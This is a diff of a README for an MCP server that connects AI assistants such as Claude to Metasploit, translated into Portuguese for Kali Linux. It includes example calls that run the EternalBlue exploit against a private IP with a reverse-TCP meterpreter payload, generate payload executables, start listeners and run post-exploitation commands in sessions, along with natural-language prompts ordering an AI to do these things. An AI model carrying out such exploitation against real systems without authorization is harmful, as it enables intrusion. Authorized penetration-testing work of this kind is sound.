@@ -1,321 +1,291 @@
-# Metasploit MCP Server
+# Servidor MCP Metasploit
 
-A Model Context Protocol (MCP) server for Metasploit Framework integration.
+Um servidor MCP (Model Context Protocol) para integração com o Metasploit Framework no Kali Linux.
 
+## Descrição
 
-https://github.com/user-attachments/assets/39b19fb5-8397-4ccd-b896-d1797ec185e1
+Este servidor MCP fornece uma ponte entre modelos de linguagem como o Claude e a plataforma de teste de penetração Metasploit Framework. Permite que assistentes de IA acessem e controlem dinamicamente as funcionalidades do Metasploit através de ferramentas padronizadas, habilitando uma interface de linguagem natural para fluxos de trabalho complexos de testes de segurança.
 
+## Funcionalidades
 
-## Description
+### Informações de Módulos
 
-This MCP server provides a bridge between large language models like Claude and the Metasploit Framework penetration testing platform. It allows AI assistants to dynamically access and control Metasploit functionality through standardized tools, enabling a natural language interface to complex security testing workflows.
+- **list_exploits**: Buscar e listar módulos de exploit disponíveis no Metasploit
+- **list_payloads**: Buscar e listar módulos de payload disponíveis com filtragem opcional por plataforma e arquitetura
 
-## Features
+### Fluxo de Exploração
 
-### Module Information
+- **run_exploit**: Configurar e executar um exploit contra um alvo com opções para executar verificações primeiro
+- **run_auxiliary_module**: Executar qualquer módulo auxiliar do Metasploit com opções customizadas
+- **run_post_module**: Executar módulos pós-exploração contra sessões existentes
 
-- **list_exploits**: Search and list available Metasploit exploit modules
-- **list_payloads**: Search and list available Metasploit payload modules with optional platform and architecture filtering
+### Geração de Payloads
 
-### Exploitation Workflow
+- **generate_payload**: Gerar arquivos de payload usando RPC do Metasploit (salva arquivos localmente)
 
-- **run_exploit**: Configure and execute an exploit against a target with options to run checks first
-- **run_auxiliary_module**: Run any Metasploit auxiliary module with custom options
-- **run_post_module**: Execute post-exploitation modules against existing sessions
+### Gerenciamento de Sessões
 
-### Payload Generation
+- **list_active_sessions**: Mostrar sessões atuais do Metasploit com informações detalhadas
+- **send_session_command**: Executar um comando em uma sessão shell ou Meterpreter ativa
+- **terminate_session**: Finalizar forçadamente uma sessão ativa
 
-- **generate_payload**: Generate payload files using Metasploit RPC (saves files locally)
+### Gerenciamento de Handlers
 
-### Session Management
+- **list_listeners**: Mostrar todos os handlers ativos e jobs em background
+- **start_listener**: Criar um novo multi/handler para receber conexões
+- **stop_job**: Terminar qualquer job ou handler em execução
 
-- **list_active_sessions**: Show current Metasploit sessions with detailed information
-- **send_session_command**: Run a command in an active shell or Meterpreter session
-- **terminate_session**: Forcefully end an active session
+## Pré-requisitos
 
-### Handler Management
+- Metasploit Framework instalado e msfrpcd em execução
+- Kali Linux (ou distribuição baseada em Debian)
+- Python 3.10 ou superior
+- Pacotes Python necessários (veja requirements.txt)
 
-- **list_listeners**: Show all active handlers and background jobs
-- **start_listener**: Create a new multi/handler to receive connections
-- **stop_job**: Terminate any running job or handler
+## Instalação
 
-## Prerequisites
-
-- Metasploit Framework installed and msfrpcd running
-- Python 3.10 or higher
-- Required Python packages (see requirements.txt)
-
-## Installation
-
-1. Clone this repository
-2. Install dependencies:
-   ```
-   pip install -r requirements.txt
-   ```
-3. Configure environment variables (optional):
-   ```
-   MSF_PASSWORD=yourpassword
-   MSF_SERVER=127.0.0.1
-   MSF_PORT=55553
-   MSF_SSL=false
-   PAYLOAD_SAVE_DIR=/path/to/save/payloads  # Optional: Where to save generated payloads
-   ```
-
-## Usage
-
-Start the Metasploit RPC service:
+### 1. Preparar o Sistema
 
 ```bash
-msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
-```
+# Atualizar sistema (Kali Linux)
+sudo apt update && sudo apt upgrade -y
 
-### Transport Options
+# Verificar se Metasploit está instalado
+msfconsole --version
 
-The server supports two transport methods:
+# Se não estiver instalado:
+sudo apt install metasploit-framework
 
-- **HTTP/SSE (Server-Sent Events)**: Default mode for interoperability with most MCP clients
-- **STDIO (Standard Input/Output)**: Used with Claude Desktop and similar direct pipe connections
+# Verificar Python
+python3 --version
+2. Configurar o Projeto
+bash
+# Clonar repositório
+git clone https://github.com/seu-usuario/metasploit-mcp-server.git
+cd metasploit-mcp-server
 
-You can explicitly select the transport mode using the `--transport` flag:
+# Criar ambiente virtual
+python3 -m venv venv
 
-```bash
-# Run with HTTP/SSE transport (default)
+# Ativar ambiente virtual
+source venv/bin/activate
+
+# Instalar dependências
+pip install -r requirements.txt
+3. Configurar Variáveis de Ambiente (opcional)
+bash
+# Criar arquivo .env ou exportar variáveis
+export MSF_PASSWORD=suasenha
+export MSF_SERVER=127.0.0.1
+export MSF_PORT=55553
+export MSF_SSL=false
+export PAYLOAD_SAVE_DIR=/home/kali/payloads  # Opcional: onde salvar payloads gerados
+Uso
+Iniciar o Serviço RPC do Metasploit
+bash
+# Iniciar msfrpcd (deixe rodando em um terminal)
+msfrpcd -P suasenha -S -a 127.0.0.1 -p 55553
+Opções de Transporte
+O servidor suporta dois métodos de transporte:
+
+HTTP/SSE (Server-Sent Events): Modo padrão para interoperabilidade com a maioria dos clientes MCP
+STDIO (Standard Input/Output): Usado com Claude Desktop e conexões diretas similares
+Você pode selecionar explicitamente o modo de transporte usando a flag --transport:
+
+bash
+# Executar com transporte HTTP/SSE (padrão)
 python MetasploitMCP.py --transport http
 
-# Run with STDIO transport
+# Executar com transporte STDIO
 python MetasploitMCP.py --transport stdio
-```
+Opções adicionais para modo HTTP:
 
-Additional options for HTTP mode:
-```bash
+bash
 python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
-```
+Integração com Claude Desktop
+Para integração com Claude Desktop, configure o arquivo ~/.config/Claude/claude_desktop_config.json:
 
-### Claude Desktop Integration
-
-For Claude Desktop integration, configure `claude_desktop_config.json`:
-
-```json
+json
 {
     "mcpServers": {
         "metasploit": {
-            "command": "uv",
+            "command": "/home/kali/caminho/para/metasploit-mcp-server/venv/bin/python",
             "args": [
-                "--directory",
-                "C:\\path\\to\\MetasploitMCP",
-                "run",
-                "MetasploitMCP.py",
+                "/home/kali/caminho/para/metasploit-mcp-server/MetasploitMCP.py",
                 "--transport",
                 "stdio"
             ],
             "env": {
-                "MSF_PASSWORD": "yourpassword"
+                "MSF_PASSWORD": "suasenha"
             }
         }
     }
 }
-```
+Outros Clientes MCP
+Para outros clientes MCP que usam HTTP/SSE:
 
-### Other MCP Clients
+Iniciar o servidor em modo HTTP:
+bash
+python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
+Configurar seu cliente MCP para conectar em:
+Endpoint SSE: http://seu-servidor-ip:8085/sse
+Considerações de Segurança
+⚠️ AVISO IMPORTANTE DE SEGURANÇA:
 
-For other MCP clients that use HTTP/SSE:
+Esta ferramenta fornece acesso direto às capacidades do Metasploit Framework, que incluem recursos poderosos de exploração. Use com responsabilidade e apenas em ambientes onde você tem permissão explícita para realizar testes de segurança.
 
-1. Start the server in HTTP mode:
-   ```bash
-   python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
-   ```
+Sempre valide e revise todos os comandos antes da execução
+Execute apenas em ambientes de teste segregados ou com autorização adequada
+Esteja ciente de que comandos pós-exploração podem resultar em modificações significativas do sistema
+Exemplos de Fluxos de Trabalho
+Exploração Básica
+Listar exploits disponíveis: list_exploits("ms17_010")
+Selecionar e executar exploit: run_exploit("exploit/windows/smb/ms17_010_eternalblue", {"RHOSTS": "192.168.1.100"}, "windows/x64/meterpreter/reverse_tcp", {"LHOST": "192.168.1.10", "LPORT": 4444})
+Listar sessões: list_active_sessions()
+Executar comandos: send_session_command(1, "whoami")
+Pós-Exploração
+Executar módulo post: run_post_module("windows/gather/enum_logged_on_users", 1)
+Enviar comandos customizados: send_session_command(1, "sysinfo")
+Finalizar quando terminar: terminate_session(1)
+Gerenciamento de Handler
+Iniciar listener: start_listener("windows/meterpreter/reverse_tcp", "192.168.1.10", 4444)
+Listar handlers ativos: list_listeners()
+Gerar payload: generate_payload("windows/meterpreter/reverse_tcp", "exe", {"LHOST": "192.168.1.10", "LPORT": 4444})
+Parar handler: stop_job(1)
+Exemplos de Uso com Claude Desktop
+Comandos em Linguagem Natural
+"Liste exploits relacionados ao SMB"
+"Execute o exploit MS17-010 contra o host 192.168.1.100"
+"Mostre as sessões ativas"
+"Execute o comando 'systeminfo' na sessão 1"
+"Gere um payload reverse TCP para Windows x64"
+"Inicie um listener na porta 4444"
+Fluxo Completo de Pentesting
+"Busque exploits para Windows SMB e execute contra 192.168.1.50 usando um payload meterpreter reverse TCP no meu IP 192.168.1.10 porta 4444"
 
-2. Configure your MCP client to connect to:
-   - SSE endpoint: `http://your-server-ip:8085/sse`
+"Liste as sessões ativas e execute 'getuid' na primeira sessão"
 
-## Security Considerations
+"Execute o módulo de enumeração de usuários logados na sessão ativa"
 
-⚠️ **IMPORTANT SECURITY WARNING**:
+"Gere um payload executável Windows x64 com LHOST 192.168.1.10 e LPORT 5555"
+Testes
+Este projeto inclui testes unitários e de integração abrangentes para garantir confiabilidade e manutenibilidade.
 
-This tool provides direct access to Metasploit Framework capabilities, which include powerful exploitation features. Use responsibly and only in environments where you have explicit permission to perform security testing.
+Pré-requisitos para Testes
+Instalar dependências de teste:
 
-- Always validate and review all commands before execution
-- Only run in segregated test environments or with proper authorization
-- Be aware that post-exploitation commands can result in significant system modifications
-
-## Example Workflows
-
-### Basic Exploitation
-
-1. List available exploits: `list_exploits("ms17_010")`
-2. Select and run an exploit: `run_exploit("exploit/windows/smb/ms17_010_eternalblue", {"RHOSTS": "192.168.1.100"}, "windows/x64/meterpreter/reverse_tcp", {"LHOST": "192.168.1.10", "LPORT": 4444})`
-3. List sessions: `list_active_sessions()`
-4. Run commands: `send_session_command(1, "whoami")`
-
-### Post-Exploitation
-
-1. Run a post module: `run_post_module("windows/gather/enum_logged_on_users", 1)`
-2. Send custom commands: `send_session_command(1, "sysinfo")`
-3. Terminate when done: `terminate_session(1)`
-
-### Handler Management
-
-1. Start a listener: `start_listener("windows/meterpreter/reverse_tcp", "192.168.1.10", 4444)`
-2. List active handlers: `list_listeners()`
-3. Generate a payload: `generate_payload("windows/meterpreter/reverse_tcp", "exe", {"LHOST": "192.168.1.10", "LPORT": 4444})`
-4. Stop a handler: `stop_job(1)`
-
-## Testing
-
-This project includes comprehensive unit and integration tests to ensure reliability and maintainability.
-
-### Prerequisites for Testing
-
-Install test dependencies:
-
-```bash
+bash
 pip install -r requirements-test.txt
-```
+Ou usar o instalador conveniente:
 
-Or use the convenient installer:
-
-```bash
+bash
 python run_tests.py --install-deps
-# OR
+# OU
 make install-deps
-```
-
-### Running Tests
-
-#### Quick Commands
-
-```bash
-# Run all tests
+Executar Testes
+Comandos Rápidos
+bash
+# Executar todos os testes
 python run_tests.py --all
-# OR
+# OU
 make test
 
-# Run with coverage report
+# Executar com relatório de cobertura
 python run_tests.py --all --coverage
-# OR
+# OU
 make coverage
 
-# Run with HTML coverage report
+# Executar com relatório HTML de cobertura
 python run_tests.py --all --coverage --html
-# OR
+# OU
 make coverage-html
-```
-
-#### Specific Test Suites
-
-```bash
-# Unit tests only
+Suítes de Teste Específicas
+bash
+# Apenas testes unitários
 python run_tests.py --unit
-# OR
+# OU
 make test-unit
 
-# Integration tests only  
+# Apenas testes de integração
 python run_tests.py --integration
-# OR
+# OU
 make test-integration
 
-# Options parsing tests
+# Testes de parsing de opções
 python run_tests.py --options
-# OR
+# OU
 make test-options
 
-# Helper function tests
+# Testes de funções auxiliares
 python run_tests.py --helpers
-# OR
+# OU
 make test-helpers
 
-# MCP tools tests
+# Testes de ferramentas MCP
 python run_tests.py --tools
-# OR
+# OU
 make test-tools
-```
+Opções de Configuração
+Diretório de Salvamento de Payloads
+Por padrão, payloads gerados com generate_payload são salvos em um diretório payloads na sua pasta home (~/payloads). Você pode personalizar esta localização definindo a variável de ambiente PAYLOAD_SAVE_DIR.
 
-#### Test Options
+Definindo a variável de ambiente:
 
-```bash
-# Include slow tests
-python run_tests.py --all --slow
+bash
+# No terminal (temporário)
+export PAYLOAD_SAVE_DIR=/home/kali/meus-payloads
 
-# Include network tests (requires actual network)
-python run_tests.py --all --network
+# No arquivo ~/.bashrc (permanente)
+echo 'export PAYLOAD_SAVE_DIR=/home/kali/meus-payloads' >> ~/.bashrc
+source ~/.bashrc
 
-# Verbose output
-python run_tests.py --all --verbose
+# Na configuração do Claude Desktop:
+json
+"env": {
+    "MSF_PASSWORD": "suasenha",
+    "PAYLOAD_SAVE_DIR": "/home/kali/meus-payloads"
+}
+Nota: Se você especificar um caminho customizado, certifique-se de que ele existe ou que a aplicação tem permissão para criá-lo. Se o caminho for inválido, a geração de payload pode falhar.
 
-# Quick test (no coverage, fail fast)
-make quick-test
+Solução de Problemas
+msfrpcd não inicia
+bash
+# Verificar se a porta está em uso
+sudo netstat -tlnp | grep 55553
 
-# Debug mode (detailed failure info)
-make test-debug
-```
+# Matar processo se necessário
+sudo pkill msfrpcd
 
-### Test Structure
+# Iniciar novamente
+msfrpcd -P suasenha -S -a 127.0.0.1 -p 55553
+Erro de conexão
+bash
+# Verificar se o serviço está rodando
+ps aux | grep msfrpcd
 
-- **`tests/test_options_parsing.py`**: Unit tests for the graceful options parsing functionality
-- **`tests/test_helpers.py`**: Unit tests for internal helper functions and MSF client management
-- **`tests/test_tools_integration.py`**: Integration tests for all MCP tools with mocked Metasploit backend
-- **`conftest.py`**: Shared test fixtures and configuration
-- **`pytest.ini`**: Pytest configuration with coverage settings
-
-### Test Features
-
-- **Comprehensive Mocking**: All Metasploit dependencies are mocked, so tests run without requiring an actual MSF installation
-- **Async Support**: Full async/await testing support using pytest-asyncio
-- **Coverage Reporting**: Detailed coverage analysis with HTML reports
-- **Parametrized Tests**: Efficient testing of multiple input scenarios
-- **Fixture Management**: Reusable test fixtures for common setup scenarios
-
-### Coverage Reports
-
-After running tests with coverage, reports are available in:
-
-- **Terminal**: Coverage summary displayed after test run
-- **HTML**: `htmlcov/index.html` (when using `--html` option)
-
-### CI/CD Integration
-
-For continuous integration:
-
-```bash
-# CI-friendly test command
-make ci-test
-# OR
-python run_tests.py --all --coverage --verbose
-```
-
-## Configuration Options
-
-### Payload Save Directory
-
-By default, payloads generated with `generate_payload` are saved to a `payloads` directory in your home folder (`~/payloads` or `C:\Users\YourUsername\payloads`). You can customize this location by setting the `PAYLOAD_SAVE_DIR` environment variable.
-
-**Setting the environment variable:**
-
-- **Windows (PowerShell)**:
-  ```powershell
-  $env:PAYLOAD_SAVE_DIR = "C:\custom\path\to\payloads"
-  ```
-
-- **Windows (Command Prompt)**:
-  ```cmd
-  set PAYLOAD_SAVE_DIR=C:\custom\path\to\payloads
-  ```
-
-- **Linux/macOS**:
-  ```bash
-  export PAYLOAD_SAVE_DIR=/custom/path/to/payloads
-  ```
-
-- **In Claude Desktop config**:
-  ```json
-  "env": {
-      "MSF_PASSWORD": "yourpassword",
-      "PAYLOAD_SAVE_DIR": "C:\\your\\actual\\path\\to\\payloads"  // Only add if you want to override the default
-  }
-  ```
-
-**Note:** If you specify a custom path, make sure it exists or the application has permission to create it. If the path is invalid, payload generation might fail.
-
-## License
-
+# Testar conexão manualmente
+telnet 127.0.0.1 55553
+Permissões de diretório
+bash
+# Criar diretório de payloads com permissões adequadas
+mkdir -p ~/payloads
+chmod 755 ~/payloads
+Compatibilidade
+Metasploit Framework: 6.0+
+Kali Linux: 2023.1+
+Python: 3.10+
+Claude Desktop: Versões com suporte MCP
+Licença
 Apache 2.0
+
+Contribuindo
+Faça fork do projeto
+Crie uma branch para sua feature (git checkout -b feature/nova-funcionalidade)
+Commit suas mudanças (git commit -am 'Adiciona nova funcionalidade')
+Push para a branch (git push origin feature/nova-funcionalidade)
+Abra um Pull Request
+Links Relacionados
+Metasploit Framework
+Model Context Protocol
+Claude Desktop
+Kali Linux
